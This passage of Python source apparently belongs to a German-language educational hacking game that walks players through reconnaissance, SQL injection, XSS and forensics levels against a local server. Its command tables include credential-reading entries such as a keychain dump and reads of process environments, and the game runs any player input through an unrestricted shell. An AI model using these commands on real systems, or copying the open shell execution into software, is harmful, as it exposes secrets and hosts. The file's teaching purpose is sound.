                if username_match:
                    sql_payload = username_match.group(1)
                    # Check if payload contains SQL injection characters
                    sql_indicators = ["'", "--", "UNION", "SELECT", "OR", "AND", "1=1", "1=2"]
                    has_sql_chars = any(indicator in sql_payload.upper() for indicator in sql_indicators)

                    if not has_sql_chars:
                        return False  # Not a valid SQL injection attempt

            success_indicators = [
                "Welcome" in response_text,
                "dashboard" in response_text,
                "Redirecting" in response_text,  # Flask redirect response
                "/dashboard" in response_text,   # Redirect target
                target_value in response_text,
                "admin" in response_text.lower() and "logged" in response_text.lower()
            ]
            return any(success_indicators)

        elif level == 4:
            # Level 4: Look for XSS success
            success_indicators = [
                "XSS" in response_text,
                "alert" in response_text,
                "script" in response_text.lower(),
                target_value in response_text,
                "cookie" in response_text.lower()
            ]
            return any(success_indicators)

        elif level == 5:
            # Level 5: Look for forensics success
            success_indicators = [
                target_value in response_text,
                "encryption" in response_text.lower(),
                "key" in response_text.lower(),
                "forensic" in response_text.lower()
            ]
            return any(success_indicators)

        return False

    def check_server_status(self):
        """Check server status"""
        print("\n🔍 Server-Status:")

        # Check if server is running by trying to connect
        server_responding = False
        try:
            if HAS_REQUESTS:
                response = requests.get("http://127.0.0.1:5000", timeout=3)
                if response.status_code == 200:
                    server_responding = True
            else:
                import urllib.request
                response = urllib.request.urlopen("http://127.0.0.1:5000", timeout=3)
                if response.getcode() == 200:
                    server_responding = True
        except:
            pass

        if server_responding:
            print("✅ Server läuft und ist erreichbar")
            print("🌐 URL: http://127.0.0.1:5000")
            print("🔍 Debug: http://127.0.0.1:5000/debug")
            self.server_running = True
        else:
            print("❌ Server ist nicht gestartet")
            print("💡 Möchtest du den Server jetzt starten? (j/n)")
            try:
                choice = input("Wähle: ").strip().lower()
                if choice in ['j', 'ja', 'y', 'yes']:
                    if self.start_server():
                        print("✅ Server erfolgreich gestartet!")
                    else:
                        print("❌ Server-Start fehlgeschlagen")
                else:
                    print("💡 Starte das Spiel (Option 1), um den Server automatisch zu starten")
            except (EOFError, KeyboardInterrupt):
                pass

        try:
            input("\nDrücke Enter zum Fortfahren...")
        except (EOFError, KeyboardInterrupt):
            pass

    def settings(self):
        """Game settings"""
        while True:
            print("\nEinstellungen:")
            print("1. Fortschritt zurücksetzen")
            print("2. Schwierigkeitsgrad ändern")
            print(f"3. Retro Effekte [{'ON' if self.retro_effects else 'OFF'}]")
            print("4. Zurück zum Menü")

            try:
                choice = input("Wähle: ").strip()
                if choice == '1':
                    try:
                        confirm = input("Bist du sicher? Das setzt den gesamten Fortschritt zurück (j/N): ")
                        if confirm.lower() == 'j':
                            os.remove(self.progress_file) if os.path.exists(self.progress_file) else None
                            self.__init__()
                            print("Fortschritt zurückgesetzt!")
                    except (EOFError, KeyboardInterrupt):
                        pass
                elif choice == '2':
                    print("Schwierigkeitsgrad-Änderung noch nicht implementiert.")
                elif choice == '3':
                    self.retro_effects = not self.retro_effects
                    print(f"Retro Effekte {'aktiviert' if self.retro_effects else 'deaktiviert'}!")
                elif choice == '4':
                    break
            except (EOFError, KeyboardInterrupt):
                break

    def play_game(self):
        """Main game loop with storyline integration"""
        print(f"\n🎮 Starte den Erbschafts-Coup für {self.player_name}...")

        print("🎯 Der Server deines Onkels läuft auf: http://127.0.0.1:5000")
        print("🔍 Prüfe den /debug Endpoint für Entwicklungshinweise")
        print("⚠️  Vergiss nicht: Das ist nur für Bildungszwecke!")

        while self.current_level <= 5:
            level_info = self.levels[self.current_level]

            # Enhanced storyline integration for each level
            if self.current_level == 1:
                self.simulate_old_terminal(f"\n🏢 LEVEL {self.current_level}: DAS ERSTE SIEGEL", delay=0.02)
                self.simulate_old_terminal("📜 GESCHICHTE: Du stehst im Arbeitszimmer deines Onkels.", delay=0.02)
                self.simulate_old_terminal("Der Raum ist voller alter Computer und Server-Racks.", delay=0.02)
                self.simulate_old_terminal("Auf dem Schreibtisch liegt eine verschlüsselte Nachricht:", delay=0.02)
                self.simulate_old_terminal("'Das erste Siegel ist in meinem persönlichen Labor versteckt.'", delay=0.02)
                self.simulate_old_terminal("'Finde es, und du wirst verstehen, warum ich paranoid war.'", delay=0.02)
                self.simulate_old_terminal("\n🎯 MISSION: Führe Web Application Reconnaissance durch!", delay=0.02)
                self.simulate_old_terminal("🔍 Finde die versteckte .env-Datei mit dem ersten Code!", delay=0.02)
            elif self.current_level == 2:
                self.simulate_old_terminal(f"\n🌐 LEVEL {self.current_level}: NETZWERK DER SCHATTEN", delay=0.02)
                self.simulate_old_terminal("📜 GESCHICHTE: Du hast das erste Siegel gebrochen!", delay=0.02)
                self.simulate_old_terminal("Aber dein Onkel hatte noch mehr Geheimnisse.", delay=0.02)
                self.simulate_old_terminal("Sein Server läuft mit Harrington Industries' proprietärem Netzwerk.", delay=0.02)
                self.simulate_old_terminal("Die Konkurrenten versuchen bereits, sich einzuhacken.", delay=0.02)
                self.simulate_old_terminal("'Das Netzwerk ist mein Meisterwerk,' flüsterte er einmal.", delay=0.02)
                self.simulate_old_terminal("'Nur die Würdigen können es knacken.'", delay=0.02)
                self.simulate_old_terminal("\n🎯 MISSION: Führe Network Discovery durch!", delay=0.02)
                self.simulate_old_terminal("🔍 Finde den versteckten API-Key im Netzwerk!", delay=0.02)
            elif self.current_level == 3:
                self.simulate_old_terminal(f"\n🔐 LEVEL {self.current_level}: DIE DATENBANK DER GEHEIMNISSE", delay=0.02)
                self.simulate_old_terminal("📜 GESCHICHTE: Das Netzwerk öffnet sich vor dir.", delay=0.02)
                self.simulate_old_terminal("Du findest eine verschlüsselte Datenbank voller dunkler Geheimnisse.", delay=0.02)
                self.simulate_old_terminal("Hier sind alle 'schmutzigen' Geschäfte von Harrington Industries gespeichert.", delay=0.02)
                self.simulate_old_terminal("Dein Onkel wusste, dass nur jemand mit reinem Herzen sie finden würde.", delay=0.02)
                self.simulate_old_terminal("'Die Datenbank enthält die Wahrheit über meine Feinde,' sagte er.", delay=0.02)
                self.simulate_old_terminal("'Aber sie ist mit SQL-Injection verwundbar - absichtlich.'", delay=0.02)
                self.simulate_old_terminal("\n🎯 MISSION: Führe SQL Injection Attack durch!", delay=0.02)
                self.simulate_old_terminal("🔍 Extrahiere den Admin-Hash aus der Datenbank!", delay=0.02)
            elif self.current_level == 4:
                self.simulate_old_terminal(f"\n💬 LEVEL {self.current_level}: DER DIGITALE SPIEGEL", delay=0.02)
                self.simulate_old_terminal("📜 GESCHICHTE: Die Datenbank öffnet ihre Tore.", delay=0.02)
                self.simulate_old_terminal("Du findest ein altes Kommentar-System - 'Digitaler Spiegel' genannt.", delay=0.02)
                self.simulate_old_terminal("Dein Onkel erschuf es, um die wahre Natur eines Menschen zu reflektieren.", delay=0.02)
                self.simulate_old_terminal("'Wenn jemand XSS versucht, zeigt es seine wahre Absicht,' sagte er.", delay=0.02)
                self.simulate_old_terminal("Die Konkurrenten versuchen bereits, sich einzuschleichen.", delay=0.02)
                self.simulate_old_terminal("Du hörst Schritte im Flur - sie kommen näher!", delay=0.02)
                self.simulate_old_terminal("\n🎯 MISSION: Führe XSS Attack durch!", delay=0.02)
                self.simulate_old_terminal("🔍 Stehle den Session-Cookie des Admins!", delay=0.02)
            elif self.current_level == 5:
                self.simulate_old_terminal(f"\n🎯 LEVEL {self.current_level}: Project Echo", delay=0.02)
                self.simulate_old_terminal("📜 GESCHICHTE: Du hast alle Siegel gebrochen!", delay=0.02)
                self.simulate_old_terminal("Vor dir liegt die finale Kammer - Project Echo.", delay=0.02)
                self.simulate_old_terminal("Die KI, die die Menschheit vor digitalen Katastrophen retten sollte.", delay=0.02)
                self.simulate_old_terminal("Aber sie wurde sabotiert. Von den gleichen Konkurrenten.", delay=0.02)
                self.simulate_old_terminal("'Phoenix wird die Welt verändern,' sagte dein Onkel.", delay=0.02)
                self.simulate_old_terminal("'Aber nur, wenn die richtige Person sie befreit.'", delay=0.02)
                self.simulate_old_terminal("Die Tür zur Kammer öffnet sich. Die Konkurrenten brechen ein!", delay=0.02)
                self.simulate_old_terminal("\n🎯 MISSION: Führe Digital Forensics durch!", delay=0.02)
                self.simulate_old_terminal("🔍 Finde den Master-Encryption-Key und rette Project Echo!", delay=0.02)

            print(f"\n📋 Description: {level_info['description']}")
            print(f"💰 Score: {self.score}")

            if self.current_level == 1:
                self.level_1_server_hacking()
            elif self.current_level == 2:
                self.level_2_network_fundamentals()
            elif self.current_level == 3:
                self.level_3_password_cracking()
            elif self.current_level == 4:
                self.level_4_web_exploitation()
            elif self.current_level == 5:
                self.level_5_advanced_topics()

            # Keine Lives mehr - Spieler kann unbegrenzt versuchen

        if self.current_level > 5:
            print("\n🎉 CONGRATULATIONS! You've claimed your inheritance!")
            print("💰 You're now a billionaire tech heir!")
            print("🏰 The family empire is yours!")
            self.echo_chat("encouragement")

    def get_target_value(self, level):
        """Generate target values for each level"""
        import hashlib

        # Create deterministic but unique values for each level
        base_string = f"echo_hacking_level_{level}_{self.player_name}"
        hash_obj = hashlib.md5(base_string.encode())
        return hash_obj.hexdigest()

    def get_platform_commands(self):
        """Get platform-specific commands based on OS - ECHO'S ULTIMATE VERSION"""
        if sys.platform.startswith('win'):
            return self.get_windows_commands()
        elif sys.platform.startswith('darwin'):
            return self.get_macos_commands()
        elif sys.platform.startswith('linux'):
            return self.get_linux_commands()
        else:
            # Enhanced fallback with more commands
            return self.get_crossplatform_fallback()

    def get_windows_commands(self):
        """Windows-specific hacking commands - Learn Windows Power"""
        return {
            # Network Analysis
            'port_scan': 'netstat -an | findstr :5000',
            'port_scan_alt': 'python telnet_client.py 127.0.0.1 5000',
            'port_scan_ps': 'powershell Test-NetConnection -ComputerName 127.0.0.1 -Port 5000',
            'port_scan_detailed': 'netstat -anb | findstr :5000',
            'network_conn': 'netstat -anb',
            'network_ps': 'powershell Get-NetTCPConnection | Where-Object {$_.LocalPort -eq 5000}',
            'tracert': 'tracert 127.0.0.1',
            'ping': 'ping -n 4 127.0.0.1',

            # Process Analysis
            'process_list': 'tasklist /v',
            'process_detailed': 'tasklist /svc',
            'process_ps': 'powershell Get-Process | Select-Object Name,Id,Path',
            'process_tree': 'powershell Get-Process | Format-Table -Property Name,Id,Parent',
            'process_kill': 'taskkill /f /pid',

            # Web Analysis
            'web_scan': 'curl -s http://127.0.0.1:5000/',
            'web_scan_ps': 'powershell Invoke-WebRequest -Uri http://127.0.0.1:5000/',
            'http_headers': 'curl -I http://127.0.0.1:5000/',
            'http_methods': 'curl -X OPTIONS http://127.0.0.1:5000/',
            'web_download': 'powershell Invoke-WebRequest -Uri http://127.0.0.1:5000/ -OutFile output.html',

            # File Operations
            'grep': 'findstr /i',
            'grep_recursive': 'findstr /s /i',
            'file_hash': 'certutil -hashfile file.txt MD5',
            'file_hash_ps': 'powershell Get-FileHash file.txt -Algorithm MD5',
            'file_hash_sha256': 'powershell Get-FileHash file.txt -Algorithm SHA256',
            'file_info': 'powershell Get-ItemProperty file.txt | Select-Object *',
            'file_permissions': 'cacls file.txt',
            'file_owner': 'powershell Get-Acl file.txt | Select-Object Owner',

            # System Information
            'system_info': 'systeminfo',
            'system_ps': 'powershell Get-ComputerInfo',
            'environment': 'set',
            'environment_ps': 'powershell Get-ChildItem Env:',
            'services': 'net start',
            'services_detailed': 'powershell Get-Service | Select-Object Name,Status,StartType',

            # Security & Forensics
            'event_logs': 'wevtutil qe Application /c:10 /f:text',
            'event_logs_ps': 'powershell Get-EventLog -LogName Application -Newest 10',
            'registry': 'reg query HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run',
            'registry_ps': 'powershell Get-ItemProperty HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run',
            'firewall': 'netsh advfirewall firewall show rule name=all',
            'firewall_ps': 'powershell Show-NetFirewallRule',

            # Text Processing
            'strings': 'powershell Select-String -Path file.txt -Pattern "search"',
            'hex_dump': 'powershell Format-Hex -Path file.txt',
            'base64_encode': 'powershell [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes("text"))',
            'base64_decode': 'powershell [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String("base64"))',

            # Advanced Windows Tools
            'wmic_process': 'wmic process get name,processid,commandline',
            'wmic_service': 'wmic service get name,startmode,pathname',
            'wmic_startup': 'wmic startup get caption,command',
            'schtasks': 'schtasks /query /fo LIST',
            'driverquery': 'driverquery /v'
        }

    def get_linux_commands(self):
        """Linux-specific hacking commands - Learn Linux Power"""
        return {
            # Advanced Network Scanning
            'port_scan': 'nmap -sS 127.0.0.1',
            'port_scan_alt': 'python telnet_client.py 127.0.0.1 5000',
            'port_scan_udp': 'nmap -sU 127.0.0.1',
            'port_scan_all': 'nmap -p- 127.0.0.1',
            'port_scan_service': 'nmap -sV 127.0.0.1',
            'port_scan_os': 'nmap -O 127.0.0.1',
            'port_scan_aggressive': 'nmap -A 127.0.0.1',
            'port_scan_script': 'nmap --script vuln 127.0.0.1',

            # Network Analysis
            'network_conn': 'netstat -tulpn',
            'network_ss': 'ss -tulpn',
            'network_listen': 'lsof -i :5000',
            'network_capture': 'tcpdump -i lo port 5000 -w capture.pcap',
            'traceroute': 'traceroute 127.0.0.1',
            'dig': 'dig @8.8.8.8 google.com',
            'whois': 'whois example.com',

            # Process Analysis
            'process_list': 'ps aux',
            'process_tree': 'pstree',
            'process_detailed': 'ps auxf',
            'process_env': 'cat /proc/$PID/environ 2>/dev/null',
            'process_fd': 'lsof -p $PID',
            'process_kill': 'kill -9',

            # Web Analysis
            'web_scan': 'curl -s http://127.0.0.1:5000/',
            'web_scan_nikto': 'nikto -h http://127.0.0.1:5000',
            'web_scan_dirb': 'dirb http://127.0.0.1:5000/',
            'web_scan_gobuster': 'gobuster dir -u http://127.0.0.1:5000 -w /usr/share/wordlists/dirb/common.txt',
            'web_scan_wfuzz': 'wfuzz -c -z file,wordlist.txt --hc 404 http://127.0.0.1:5000/FUZZ',
            'http_headers': 'curl -I http://127.0.0.1:5000/',
            'http_methods': 'curl -X OPTIONS http://127.0.0.1:5000/',
            'http_trace': 'curl -X TRACE http://127.0.0.1:5000/',

            # File Operations
            'grep': 'grep -i',
            'grep_recursive': 'grep -r -i',
            'grep_context': 'grep -B 3 -A 3 -i',
            'file_hash': 'md5sum file.txt',
            'file_hash_sha256': 'sha256sum file.txt',
            'file_info': 'stat file.txt',
            'file_permissions': 'ls -la file.txt',
            'file_find': 'find . -name "*.txt" -type f',

            # System Information
            'system_info': 'uname -a',
            'system_detailed': 'cat /etc/os-release',
            'kernel_info': 'cat /proc/version',
            'cpu_info': 'cat /proc/cpuinfo',
            'memory_info': 'cat /proc/meminfo',
            'disk_info': 'df -h',
            'mounted_fs': 'mount',
            'environment': 'env',
            'services': 'systemctl list-units --type=service',
            'services_sysv': 'service --status-all',

            # Security & Forensics
            'logs_syslog': 'tail -f /var/log/syslog',
            'logs_auth': 'tail -f /var/log/auth.log',
            'logs_apache': 'tail -f /var/log/apache2/access.log',
            'audit_logs': 'ausearch -i',
            'selinux_status': 'sestatus',
            'apparmor_status': 'aa-status',
            'firewall_iptables': 'iptables -L -n -v',
            'firewall_ufw': 'ufw status',

            # Text Processing
            'strings': 'strings file.txt',
            'hex_dump': 'hexdump -C file.txt',
            'base64_encode': 'base64 file.txt',
            'base64_decode': 'base64 -d file.txt',
            'xxd': 'xxd file.txt',
            'od': 'od -c file.txt',

            # Advanced Linux Tools
            'ldd': 'ldd /bin/ls',
            'strace': 'strace -e trace=network,process ls',
            'ltrace': 'ltrace ls',
            'gdb': 'gdb --batch --ex "info functions" /bin/ls',
            'objdump': 'objdump -d /bin/ls',
            'readelf': 'readelf -a /bin/ls'
        }

    def get_macos_commands(self):
        """macOS-specific hacking commands - Learn macOS Power"""
        return {
            # Network Analysis
            'port_scan': 'netstat -an | grep :5000',
            'port_scan_alt': 'python telnet_client.py 127.0.0.1 5000',
            'network_conn': 'netstat -an',
            'network_lsof': 'lsof -i :5000',
            'network_pf': 'pfctl -s rules',
            'network_route': 'netstat -rn',
            'ping': 'ping -c 4 127.0.0.1',

            # Process Analysis
            'process_list': 'ps aux',
            'process_tree': 'pstree',
            'process_detailed': 'ps auxm',
            'process_top': 'top -l 1',
            'process_vmmap': 'vmmap $PID',

            # Web Analysis
            'web_scan': 'curl -s http://127.0.0.1:5000/',
            'http_headers': 'curl -I http://127.0.0.1:5000/',
            'http_methods': 'curl -X OPTIONS http://127.0.0.1:5000/',

            # File Operations
            'grep': 'grep -i',
            'grep_recursive': 'grep -r -i',
            'file_hash': 'md5 file.txt',
            'file_hash_openssl': 'openssl dgst -md5 file.txt',
            'file_info': 'stat file.txt',
            'file_permissions': 'ls -la file.txt',
            'file_find': 'find . -name "*.txt" -type f',

            # System Information
            'system_info': 'system_profiler SPSoftwareDataType',
            'system_profiler': 'system_profiler',
            'hardware_info': 'system_profiler SPHardwareDataType',
            'network_info': 'system_profiler SPNetworkDataType',
            'disk_info': 'diskutil info disk0',
            'mounted_volumes': 'mount',
            'environment': 'env',

            # Security & Forensics
            'logs_system': 'log show --predicate "process == \\"python\\"" --last 1h',
            'logs_console': 'syslog -F $(date +%Y-%m-%d) | tail -20',
            'sip_status': 'csrutil status',
            'gatekeeper_status': 'spctl --status',
            'sandbox_status': 'sandbox-exec -f /tmp/test.sb true',
            'keychain_dump': 'security dump-keychain',
            'codesign_verify': 'codesign --verify --verbose',

            # Text Processing
            'strings': 'strings file.txt',
            'hex_dump': 'hexdump -C file.txt',
            'base64_encode': 'base64 file.txt',
            'base64_decode': 'base64 -D file.txt',
            'plist_read': 'plutil -p file.plist',
            'defaults_read': 'defaults read com.apple.finder',

            # Advanced macOS Tools
            'airport_info': '/System/Library/PrivateFrameworks/Apple80211.framework/Versions/A/Resources/airport -I',
            'scutil_dns': 'scutil --dns',
            'scutil_proxy': 'scutil --proxy',
            'launchctl_list': 'launchctl list',
            'kextstat': 'kextstat',
            'nvram': 'nvram -p'
        }

    def get_crossplatform_fallback(self):
        """Enhanced fallback commands that work on most systems"""
        return {
            'port_scan': 'netstat -an',
            'port_scan_alt': 'python telnet_client.py 127.0.0.1 5000',
            'web_scan': 'curl -s http://127.0.0.1:5000/',
            'http_headers': 'curl -I http://127.0.0.1:5000/',
            'http_methods': 'curl -X OPTIONS http://127.0.0.1:5000/',
            'grep': 'grep -i',
            'process_list': 'ps aux',
            'network_conn': 'netstat -an',
            'file_hash': 'md5sum file.txt',
            'strings': 'strings file.txt',
            'file_type': 'file file.txt',
            'which_python': 'which python',
            'python_version': 'python --version',
            'curl_version': 'curl --version',
            'test_connection': 'curl -s -o /dev/null -w "%{http_code}" http://127.0.0.1:5000/'
        }

    def typewriter_effect(self, text, delay=0.03, color_code=None):
        """Simulate old terminal typewriter effect"""
        if not self.retro_effects:
            print(text)
            return

        if color_code:
            print(f"\033[{color_code}m", end="", flush=True)

        for char in text:
            print(char, end="", flush=True)
            time.sleep(delay)

        if color_code:
            print("\033[0m", end="", flush=True)
        print()

    def simulate_command_execution(self, command, output, delay=0.1):
        """Simulate old system command execution with character-by-character output"""
        print(f"\n💻 {self.player_name}@hacking-target:~$ {command}")

        if not self.retro_effects:
            if output:
                print(f"📄 {output}")
            else:
                print("📄 (Keine Ausgabe)")
            return

        time.sleep(0.5)

        # Simulate command processing
        print("🔄 Verarbeite Befehl...", end="", flush=True)
        for i in range(3):
            time.sleep(0.3)
            print(".", end="", flush=True)
        print()

        # Simulate output appearing line by line
        if output:
            lines = output.split('\n')
            for line in lines:
                if line.strip():
                    # Simulate old terminal line-by-line output
                    self.typewriter_effect(f"📄 {line}", delay=0.02, color_code="32")
                    time.sleep(0.1)
                else:
                    time.sleep(0.05)
        else:
            self.typewriter_effect("📄 (Keine Ausgabe)", delay=0.02, color_code="33")

    def simulate_old_terminal(self, text, delay=0.01):
        """Simulate old mainframe/terminal character-by-character display"""
        if not self.retro_effects:
            print(text)
            return

        for char in text:
            print(char, end="", flush=True)
            time.sleep(delay)
        print()

    def show_retro_banner(self):
        """Display retro terminal banner"""
        banner = """
╔══════════════════════════════════════════════════════════════╗
║                                                              ║
║  [ECHO'S ULTIMATE HACKING SIMULATOR BETA v1.0.1]             ║
║  [          EDUCATIONAL PURPOSE ONLY!          ]             ║
║  [DO NOT USE ON REAL SYSTEMS WITHOUT PERMISSION]             ║
║                                                              ║
╚══════════════════════════════════════════════════════════════╝
        """

        # Clear screen first
        os.system('cls' if os.name == 'nt' else 'clear')

        # Type the banner character by character
        for line in banner.split('\n'):
            self.simulate_old_terminal(line, delay=0.005)
            time.sleep(0.1)

        time.sleep(1)
        print("\n" + "="*70)
        self.simulate_old_terminal("INITIALIZING HACKING SIMULATOR...", delay=0.03)
        self.simulate_old_terminal("LOADING VULNERABILITY DATABASE...", delay=0.03)
        self.simulate_old_terminal("ESTABLISHING SECURE CONNECTION...", delay=0.03)
        self.simulate_old_terminal("READY FOR MISSION, AGENT.", delay=0.03)
        print("="*70)
        time.sleep(2)

    def level_1_server_hacking(self):
        """Level 1: Web Application Reconnaissance & Information Gathering - ECHO'S ULTIMATE EDITION"""
        self.simulate_old_terminal("\n🏢 LEVEL 1: WEB APPLICATION RECONNAISSANCE", delay=0.02)
        self.simulate_old_terminal("📜 STORY: Dein Onkel war paranoid - der erste Code ist in einer versteckten .env-Datei!", delay=0.02)
        self.simulate_old_terminal("🎯 MISSION: Führe professionelle Web Application Security Testing durch!", delay=0.02)
        self.echo_chat("level1")

        # Get the target value for this level
        target_value = self.get_target_value(1)
        commands = self.get_platform_commands()

        # Enhanced Web Application Security Testing Tutorial
        self.simulate_old_terminal("\n" + "="*80, delay=0.01)
        self.simulate_old_terminal("📚 ECHO'S ULTIMATE WEB APPLICATION SECURITY TESTING TUTORIAL", delay=0.02)
        self.simulate_old_terminal("="*80, delay=0.01)

        # Platform-specific introduction
        if sys.platform.startswith('win'):
            self.simulate_old_terminal(f"\n🖥️  WINDOWS WEB APPLICATION TESTING ({sys.platform.upper()}):", delay=0.02)
            self.simulate_old_terminal("   Lerne professionelle Windows-Tools für Web Application Security!", delay=0.02)
        elif sys.platform.startswith('linux'):
            self.simulate_old_terminal(f"\n🐧 LINUX WEB APPLICATION TESTING ({sys.platform.upper()}):", delay=0.02)
            self.simulate_old_terminal("   Lerne professionelle Linux-Tools für Penetration Testing!", delay=0.02)
        elif sys.platform.startswith('darwin'):
            self.simulate_old_terminal(f"\n🍎 MACOS WEB APPLICATION TESTING ({sys.platform.upper()}):", delay=0.02)
            self.simulate_old_terminal("   Lerne professionelle macOS-Tools für Security Testing!", delay=0.02)

        self.simulate_old_terminal("\n🔍 PHASE 1: INFORMATION GATHERING", delay=0.02)
        self.simulate_old_terminal(f"   {commands['http_headers']}     → HTTP Security Headers analysieren", delay=0.02)
        self.simulate_old_terminal(f"   {commands['http_methods']} → HTTP Methods & Capabilities testen", delay=0.02)
        self.simulate_old_terminal(f"   {commands['web_scan']}     → Application Response analysieren", delay=0.02)
        self.simulate_old_terminal("   curl -s -I -L http://127.0.0.1:5000/  → Follow Redirects mit Headers", delay=0.02)

        self.simulate_old_terminal("\n🎯 PHASE 2: CONFIGURATION DISCOVERY", delay=0.02)
        self.simulate_old_terminal("   curl http://127.0.0.1:5000/.env.local     → Environment Variables", delay=0.02)
        self.simulate_old_terminal("   curl http://127.0.0.1:5000/.env           → Backup Environment", delay=0.02)
        self.simulate_old_terminal("   curl http://127.0.0.1:5000/config.json    → Configuration Files", delay=0.02)
        self.simulate_old_terminal("   curl http://127.0.0.1:5000/.git/HEAD      → Git Repository Info", delay=0.02)

        self.simulate_old_terminal("\n🔍 PHASE 3: ENDPOINT ENUMERATION", delay=0.02)
        self.simulate_old_terminal("   curl http://127.0.0.1:5000/debug          → Debug Endpoints", delay=0.02)
        self.simulate_old_terminal("   curl http://127.0.0.1:5000/api/           → API Discovery", delay=0.02)
        self.simulate_old_terminal("   curl http://127.0.0.1:5000/admin          → Admin Panels", delay=0.02)
        self.simulate_old_terminal("   curl http://127.0.0.1:5000/backup         → Backup Endpoints", delay=0.02)
        self.simulate_old_terminal("   curl http://127.0.0.1:5000/test           → Test Environments", delay=0.02)

        self.simulate_old_terminal("\n🛡️ PHASE 4: SECURITY ASSESSMENT", delay=0.02)
        self.simulate_old_terminal(f"   {commands['http_headers']} | {commands['grep']} -i security", delay=0.02)
        self.simulate_old_terminal(f"   {commands['http_headers']} | {commands['grep']} -i x-", delay=0.02)
        self.simulate_old_terminal("   curl -s http://127.0.0.1:5000/ | grep -i 'server'", delay=0.02)
        self.simulate_old_terminal("   curl -s http://127.0.0.1:5000/ | grep -i 'powered'", delay=0.02)

        self.simulate_old_terminal("\n🎯 PHASE 5: ADVANCED DISCOVERY", delay=0.02)
        self.simulate_old_terminal("   curl http://127.0.0.1:5000/robots.txt     → Robots.txt Analysis", delay=0.02)
        self.simulate_old_terminal("   curl http://127.0.0.1:5000/sitemap.xml    → Sitemap Discovery", delay=0.02)
        self.simulate_old_terminal("   curl http://127.0.0.1:5000/manifest.json  → Web App Manifest", delay=0.02)
        self.simulate_old_terminal("   curl http://127.0.0.1:5000/.well-known/   → Security.txt Discovery", delay=0.02)

        self.simulate_old_terminal(f"\n🎯 ZIEL: Finde den API-Key: {target_value[:8]}...", delay=0.02)
        self.simulate_old_terminal("💡 HINWEIS: Der Key ist in einer versteckten Konfigurationsdatei!", delay=0.02)
        self.simulate_old_terminal("="*80, delay=0.01)

        # Enhanced success criteria
        success_patterns = [
            target_value,
            "API_KEY=",
            "api_key=",
            "FLAG_LEVEL_1",
            "level_1_secret",
            ".env.local",
            "DB_PASS",
            "JWT_SECRET"
        ]

        while True:
            # Platform-specific command suggestions
            if sys.platform.startswith('win'):
                self.simulate_old_terminal("\n💡 WINDOWS WEB TESTING TOOLS:", delay=0.02)
                self.simulate_old_terminal(f"  • {commands['web_scan_ps']} → PowerShell Web Requests", delay=0.02)
                self.simulate_old_terminal(f"  • {commands['http_headers']} → HTTP Security Analysis", delay=0.02)
                self.simulate_old_terminal(f"  • {commands['grep']} 'API_KEY' → Text Search in Output", delay=0.02)
                self.simulate_old_terminal("  • curl -s http://127.0.0.1:5000/.env.local → Environment Discovery", delay=0.02)
            elif sys.platform.startswith('linux'):
                self.simulate_old_terminal("\n💡 LINUX PENETRATION TESTING TOOLS:", delay=0.02)
                self.simulate_old_terminal("  • curl -s -I http://127.0.0.1:5000/ | grep -i 'server'", delay=0.02)
                self.simulate_old_terminal("  • curl -s http://127.0.0.1:5000/.env.local", delay=0.02)
                self.simulate_old_terminal("  • curl -s http://127.0.0.1:5000/debug", delay=0.02)
                self.simulate_old_terminal("  • curl -X OPTIONS http://127.0.0.1:5000/", delay=0.02)
            else:  # macOS
                self.simulate_old_terminal("\n💡 MACOS SECURITY TESTING TOOLS:", delay=0.02)
                self.simulate_old_terminal("  • curl -s -H 'User-Agent: Security-Scanner' http://127.0.0.1:5000/", delay=0.02)
                self.simulate_old_terminal("  • curl -s http://127.0.0.1:5000/.env.local", delay=0.02)
                self.simulate_old_terminal("  • curl -s http://127.0.0.1:5000/debug", delay=0.02)

            cmd = input("\nGib deinen Web Application Security Testing Befehl ein: ").strip()

            if cmd == "/echo":
                self.echo_chat("level1")
                continue
            elif cmd == "/help":
                self.show_level_help(1)
                continue

            # Auto-convert simple URLs to curl commands for better UX
            if cmd.startswith("http://") or cmd.startswith("http://"):
                cmd = f"curl -s {cmd}"
                print(f"💡 Auto-converting to: {cmd}")

            try:
                # Execute command with enhanced error handling
                result = subprocess.run(cmd, shell=True, capture_output=True, text=True,
                                    timeout=20, encoding='utf-8', errors='replace')

                # Enhanced command execution simulation
                print(f"\n💻 {self.player_name}@web-security:~$ {cmd}")

                # Show command output with realistic formatting
                if result.stdout:
                    print("📄 RESPONSE:")
                    print(result.stdout)
                else:
                    print("📄 (No response body)")

                # Enhanced error handling
                if result.stderr and result.stderr.strip():
                    if not result.stderr.startswith('  % Total'):  # Ignore curl progress
                        print("⚠️  ERROR/WARNING:")
                        print(result.stderr)

                # Check if command found the target (even without direct pattern match)
                if any(pattern in (result.stdout or "") for pattern in success_patterns):
                    self.level_1_success_message(target_value)
                    break

            except subprocess.TimeoutExpired:
                print("⏰ Command timed out. Try a different approach.")
            except Exception as e:
                print(f"❌ Command failed: {e}")

        self.current_level = 2

    def level_1_success_message(self, target_value):
        """Enhanced success message for Level 1"""
        self.simulate_old_terminal(f"\n🎉 EXCELLENT! Du hast den API-Key gefunden: {target_value}", delay=0.02)
        self.simulate_old_terminal("🏆 LEVEL 1 ABGESCHLOSSEN! +150 Punkte", delay=0.02)
        self.simulate_old_terminal("\n📚 ECHO'S WEB APPLICATION SECURITY LESSONS:", delay=0.02)
        self.simulate_old_terminal("   • Information Gathering ist der Grundstein jedes Penetration Tests", delay=0.02)
        self.simulate_old_terminal("   • Configuration Files enthalten die wertvollsten Geheimnisse", delay=0.02)
        self.simulate_old_terminal("   • HTTP Headers verraten viel über die Server-Security", delay=0.02)
        self.simulate_old_terminal("   • Debug Endpoints sind oft vergessene Sicherheitslücken", delay=0.02)
        self.simulate_old_terminal("   • Robots.txt und Sitemaps zeigen versteckte Strukturen", delay=0.02)
        self.simulate_old_terminal("\n🛡️ PROFESSIONELLE ABWEHR-STRATEGIEN:", delay=0.02)
        self.simulate_old_terminal("   • .env-Dateien NIEMALS ins Git committen!", delay=0.02)
        self.simulate_old_terminal("   • Sensitive Files in .gitignore und Web Server Config ausschließen", delay=0.02)
        self.simulate_old_terminal("   • Debug-Modi nur in Development-Umgebungen aktivieren", delay=0.02)
        self.simulate_old_terminal("   • Security Headers: HSTS, CSP, X-Frame-Options, X-Content-Type-Options", delay=0.02)
        self.simulate_old_terminal("   • HTTP Methods auf das Nötigste einschränken (GET, POST)", delay=0.02)
